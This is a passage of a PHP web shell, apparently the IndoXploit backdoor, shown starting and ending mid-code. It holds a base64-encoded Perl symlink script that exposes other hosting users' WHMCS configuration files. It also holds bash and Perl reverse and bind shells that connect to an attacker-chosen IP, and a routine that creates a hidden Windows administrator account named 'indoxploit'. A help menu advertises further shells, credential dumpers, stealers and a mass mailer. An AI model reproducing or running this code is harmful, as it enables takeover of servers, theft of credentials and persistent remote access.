+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CSUxMSU5HL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CVVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9idXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NQU5BR0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9tYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DTElFTlRTVVBQT1JUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NoZWNrb3V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmFza2V0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NhbGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9QdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3B1cmNoYXNlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9hY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC91c2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGxpbmdzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NeS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL215L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BhbmVsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydC9vcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0NCik7DQpmb3JlYWNoIChAYXJyYXkpew0KCW15ICRjb25maWdueWEgPSAkXy0+e2NvbmZpZ2Rpcn07DQoJbXkgJHR5cGVjb25maWcgPSAkXy0+e3R5cGV9Ow0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJibGFja3N5bS8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsNCglta2RpciAiYmxhY2tzeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0IjsNCglzeW1saW5rKCIkY29uZmlnbnlhIiwiYmxhY2tzeW0vJHVzZXJueWEtJHR5cGVjb25maWcudHh0LzB4MTk5OS50eHQiKTsNCgljb3B5KCJibGFja3N5bS9uZW11LnR4dCIsImJsYWNrc3ltLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dC8uaHRhY2Nlc3MiKSA7DQoJfQ0KfQ0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCAiPGhlYWQ+PHRpdGxlPkJ5cGFzcyA0MDQgQnkgMHgxOTk5PC90aXRsZT48L2hlYWQ+IjsNCnByaW50ICc8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSI1OyB1cmw9YmxhY2tzeW0iLz4nOw0KcHJpbnQgJzxib2R5PjxjZW50ZXI+PGgxPjB4MTk5OSBOZXZlciBEaWU8L2gxPic7DQpwcmludCAnPGEgaHJlZj0iYmxhY2tzeW0iPktsaWsgRGlzaW5pPC9hPic7DQp1bmxpbmsoJDApOw0K";
                save("/tmp/symlink.pl", "w", base64_decode($sym['code']));
                exe("perl /tmp/symlink.pl");
                sleep(1);
                @unlink("/tmp/symlink.pl");
                @unlink("passwd.txt");
                @unlink("blacksym/pas.txt");
                @unlink("blacksym/nemu.txt");
            }
            print "<div style='background: #ffffff; width: 100%; height: 100%'>";
            print "<iframe src='http://" . $_SERVER['HTTP_HOST'] . "/" . $GLOBALS['FILEPATH'] . "/blacksym/' frameborder='0' scrolling='yes'></iframe>";
            print "</div>";
        } elseif ($toolsname === "help") {
            print "
	<html>
<body>
	<center>
<br>
<i>Usage: [OPTION]</i>
<br>
Run this tool only [OPTION] ,same as 'jumping'</h3>
<table border='1'>
	<tr>
        <td><font color='red'>OPTION</td>
        <td><font color='red'>etc.</font></td>
    </tr>
    <pre></pre>
    <tr>
        <td>jumping</td>
        <td>--jumping</td>
    </tr>
    <tr>
        <td>symlink</td>
        <td>--symlink</td>
    </tr>
    <tr>
        <td>krdp</td>
        <td>--if windows servers you can add rdp</td>
    </tr>
    <tr>
        <td>killme</td>
        <td>--kill urself bitch</td>
    </tr>
    </center>
</table>
<br>
<i>Usage: spawn [OPTION]...</i>
<br>
Run this tools.  With no OPTION, same as '-s'
<table border='1'>
	<tr>
        <td><font color='red'>OPTION</font></td>
        <td><font color='red'>etc.</font></td>
    </tr>
    <tr>
        <td>-a</td>
        <td>--Adminer</td>
    </tr>
    <tr>
        <td>-p</td>
        <td>--Pasirmerah</td>
    </tr>
    <tr>
        <td>-i</td>
        <td>--IndoXploit</td>
    </tr>
    <tr>
        <td>-s</td>
        <td>--SabunMassal</td>
    </tr>
    <tr>
        <td>-w</td>
        <td>--WSO</td>
    </tr>
    <tr>
        <td>-d</td>
        <td>--Dumper shell[email only]</td>
    </tr>
    <tr>
        <td>-m</td>
        <td>--Magentools [dumper,stealer,etc]</td>
    </tr>
    <tr>
        <td>-h</td>
        <td>--Hsphere Bypass [if hsphere serv]</td>
    </tr>
    <tr>
        <td>-aa</td>
        <td>--AnonGhost ByPass Shell</td>
    </tr>
    <tr>
        <td>-ww</td>
        <td>--Weevely Remote Shell [defpass:4848]</td>
    </tr>
    <tr>
        <td>-ma</td>
        <td>--Mass Mailer</td>
    </tr>
    </center>
</table>
<br>
Greetz for :<br>
<td><font color='red'><i>
IndoXploit , Pasirmerah Shell, Sabun Masal, WSO, 
<br>Dumper Shell, AnonGhost Shell</font>
<br>
BIG THANKS WE RESPECT UR CODE</i>
</body>
</html>

		";
        } elseif ($toolsname === "network") {
            $args = explode(" ", $args);
            if ($args[0] === "bc") {
                if (empty($args[1])) die(color(1, 1, "Set Your IP for BackConnect!"));
                if (empty($args[2])) die(color(1, 1, "Set Your PORT for BackConnect!"));
                if (empty($args[3])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
                if ($args[3] === "bash") {
                    exe("/bin/bash -i >& /dev/tcp/" . $args[1] . "/" . $args[2] . " 0>&1");
                } elseif ($args[3] === "perl") {
                    $bc['code'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
                    save("/tmp/bc.pl", "w", base64_decode($bc['code']));
                    $bc['exec'] = exe("perl /tmp/bc.pl " . $args[1] . " " . $args[2] . " 1>/dev/null 2>&1 &");
                    sleep(1);
                    print "<pre>" . $bc['exec'] . "
" . exe("ps aux | grep bc.pl") . "</pre>";
                    @unlink("/tmp/bc.pl");
                }
            } elseif ($args[0] === "bp") {
                if (empty($args[1])) die(color(1, 1, "Set Your PORT for Bind Port!"));
                if (empty($args[2])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));
                if ($args[2] === "perl") {
                    $bp['code'] = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
                    save("/tmp/bp.pl", "w", base64_decode($bp['code']));
                    $bp['exec'] = exe("perl /tmp/bp.pl " . $args[1] . " 1>/dev/null 2>&1 &");
                    sleep(1);
                    print "<pre>" . $bp['exec'] . "
" . exe("ps aux | grep bp.pl") . "</pre>";
                    @unlink("/tmp/bp.pl");
                }
            } else {
                print color(1, 1, "Unknown '" . $args[0] . "'");
            }
        } elseif ($toolsname === "krdp") {
            $args = explode(" ", $args);
            if (OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
            if (preg_match("/indoxploit/", exe("net user"))) die(color(1, 1, "[INFO] username 'indoxploit' already exists."));
            $add_user = exe("net user indoxploit indoxploit /add");
            $add_groups1 = exe("net localgroup Administrators indoxploit /add");
            $add_groups2 = exe("net localgroup Administrator indoxploit /add");
            $add_groups3 = exe("net localgroup Administrateur indoxploit /add");
            print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: " . color(1, 2, $GLOBALS['SERVERIP']) . "<br>
    	Username: " . color(1, 2, "indoxploit") . "<br>
    	Password: " . color(1, 2, "indoxploit") . "<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
            if ($add_user) {
                print "[add user] -> " . color(1, 2, "SUCCESS") . "<br>";
            } else {
                print "[add user] -> " . color(1, 1, "FAILED") . "<br>";
            }
            if ($add_groups1) {
                print "[add localgroup Administrators] -> " . color(1, 2, "SUCCESS") . "<br>";
            } elseif ($add_groups2) {
                print "[add localgroup Administrator] -> " . color(1, 2, "SUCCESS") . "<br>";
            } elseif ($add_groups3) {
                print "[add localgroup Administrateur] -> " . color(1, 2, "SUCCESS") . "<br>";
            } else {
                print "[add localgroup] -> " . color(1, 1, "FAILED") . "<br>";
            }
            print "------------------------------<br>";
        }
    }
    function files_and_folder() {
        if (!is_dir(path())) die(color(1, 1, "Directory '" . path() . "' is not exists."));
        if (!is_readable(path())) die(color(1, 1, "Directory '" . path() . "' not readable."));
        print '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
		   <tr>
		   <th class="th_home"><center>N</center></th>
		   <th class="th_home"><center>T</center></th>
		   <th class="th_home"><center>S</center></th>
		   <th class="th_home"><center>LM</center></th>
		   <th class="th_home"><center>Group</center></th>
		   <th class="th_home"><center>Perm</center></th>
		   <th class="th_home"><center>Act</center></th>
		   </tr>';
        if (function_exists('opendir')) {
            if ($opendir = opendir(path())) {
                while (($readdir = readdir($opendir)) !== false) {
                    $dir[] = $readdir;
                }
                closedir($opendir);
            }
            sort($dir);
        } else {
            $dir = scandir(path());
        }
        foreach ($dir as $folder) {
            $dirinfo['path'] = path() . DIRECTORY_SEPARATOR . $folder;
            if (!is_dir($dirinfo['path'])) continue;
            $dirinfo['type'] = filetype($dirinfo['path']);
            $dirinfo['time'] = date("F d Y", filemtime($dirinfo['path']));
            $dirinfo['size'] = "-";
            $dirinfo['perms'] = writeable($dirinfo['path'], perms($dirinfo['path']));
            $dirinfo['link'] = ($folder === ".." ? "<a href='?dir=" . dirname(path()) . "'>$folder</a>" : ($folder === "." ? "<a href='?dir=" . path() . "'>$folder</a>" : "<a href='?dir=" . $dirinfo['path'] . "'>$folder</a>"));
            $dirinfo['action'] = ($folder === '.' || $folder === '..') ? "<a href='?act=newfile&dir=" . path() . "'>newfile</a> | <a href='?act=newfolder&dir=" . path() . "'>newfolder</a>" : "<a href='?act=rename_folder&dir=" . $dirinfo['path'] . "'>R</a> | <a href='?act=delete_folder&dir=" . $dirinfo['path'] . "'>RM</a>";
            if (function_exists('posix_getpwuid')) {
                $dirinfo['owner'] = (object)@posix_getpwuid(fileowner($dirinfo['path']));
                $dirinfo['owner'] = $dirinfo['owner']->name;
            } else {
                $dirinfo['owner'] = fileowner($dirinfo['path']);
            }
            if (function_exists('posix_getgrgid')) {
                $dirinfo['group'] = (object)@posix_getgrgid(filegroup($dirinfo['path']));
                $dirinfo['group'] = $dirinfo['group']->name;
            } else {
                $dirinfo['group'] = filegroup($dirinfo['path']);
            }
            print "<tr>";
            print "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA" . "AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp" . "/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>" . $dirinfo['link'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $dirinfo['type'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $dirinfo['size'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $dirinfo['time'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $dirinfo['owner'] . DIRECTORY_SEPARATOR . $dirinfo['group'] . "</td>";
            print "<td class='td_home' style='text-align: center;'>" . $dirinfo['perms'] . "</td>";
            print "<td class='td_home' style='padding-left: 15px;'>" . $dirinfo['action'] . "</td>";
            print "</tr>";
        }
        foreach ($dir as $files) {
            $fileinfo['path'] = path() . DIRECTORY_SEPARATOR . $files;
            if (!is_file($fileinfo['path'])) continue;
            $fileinfo['type'] = filetype($fileinfo['path']);
            $fileinfo['time'] = date("F d Y", filemtime($fileinfo['path']));
            $fileinfo['size'] = filesize($fileinfo['path']) / 1024;
            $fileinfo['size'] = round($fileinfo['size'], 3);
            $fileinfo['size'] = ($fileinfo['size'] > 1024) ? round($fileinfo['size'] / 1024, 2) . "MB" : $fileinfo['size'] . "KB";
            $fileinfo['perms'] = writeable($fileinfo['path'], perms($fileinfo['path']));
            if (function_exists('posix_getpwuid')) {
                $fileinfo['owner'] = (object)@posix_getpwuid(fileowner($fileinfo['path']));
                $fileinfo['owner'] = $fileinfo['owner']->name;
            } else {
                $fileinfo['owner'] = fileowner($fileinfo['path']);
            }
            if (function_exists('posix_getgrgid')) {
                $fileinfo['group'] = (object)@posix_getgrgid(filegroup($fileinfo['path']));
                $fileinfo['group'] = $fileinfo['group']->name;
            } else {
                $fileinfo['group'] = filegroup($fileinfo['path']);
            }
            print "<tr>";
            print "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8